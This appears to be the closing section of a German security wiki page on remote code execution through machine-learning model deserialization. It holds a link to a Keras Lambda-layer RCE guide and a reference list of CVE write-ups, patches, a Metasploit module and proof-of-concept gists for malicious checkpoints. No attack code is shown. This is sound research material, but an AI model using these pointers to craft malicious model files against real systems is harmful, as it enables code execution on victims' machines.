Eine ausführliche Anleitung zu den Interna von .keras, RCE über Lambda-Layer, dem Problem beliebiger Imports in Versionen ≤ 3.8 und der Suche nach Gadgets innerhalb der Allowlist findest du hier:


{{#ref}}
keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [OffSec-Blog – „CVE-2024-12029 – Deserialisierung nicht vertrauenswürdiger Daten in InvokeAI“](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [InvokeAI-Patch-Commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Dokumentation des Rapid7-Metasploit-Moduls](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – Sicherheitsüberlegungen zu torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [ZDI-Blog – CVE-2025-23298: Erzielung von Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [ZDI-Sicherheitshinweis: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Transformers4Rec-Patch-Commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Verwundbarer Loader vor dem Patch (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [PoC für einen schädlichen Checkpoint (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Loader nach dem Patch (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – Remote Code Execution mit modernen AI/ML-Formaten und Bibliotheken](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Hydra-Dokumentation zu instantiate](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Hydra-Commit zur Blockliste (Warnung vor RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – Von SQLi zu RCE: Ausnutzung des Checkpointers von LangGraph](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Archive-Slip-Fehler in wertvolle AI/ML-Bounty-Chancen verwandeln](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
- [17] [Snyk-Sicherheitshinweis und PyFunc-Proof-of-Concept – CVE-2024-37054](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-7210300)
- [18] [MLflow-Quellcode – PyFunc `model.py`](https://github.com/mlflow/mlflow/blob/master/mlflow/pyfunc/model.py)
- [19] [MLflow-REST-API – Endpunkte zum Herunterladen und Hochladen von Artefakten](https://mlflow.org/docs/latest/api_reference/rest-api.html)
- [20] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
- [21] [Binarly MLTracer: Taxonomie zur Umgehung statischer Scanner](https://raw.githubusercontent.com/binarly-io/ai-supply-chain-attacks-research/master/MLTracer/evasion.md)
- [22] [Binarly – Erkennung schädlicher Modelle mit MLTracer](https://binarly.io/blog/malicious-model-detection-mltracer)
- [23] [PyTorch-Implementierung von `_load_from_bytes` für Storage](https://raw.githubusercontent.com/pytorch/pytorch/main/torch/storage.py)
- [24] [CPython-Pickle: Kompatibilitätszuordnung für `find_class`](https://raw.githubusercontent.com/python/cpython/main/Lib/pickle.py)
- [25] [CPython `_compat_pickle`: Importzuordnung](https://raw.githubusercontent.com/python/cpython/main/Lib/_compat_pickle.py)
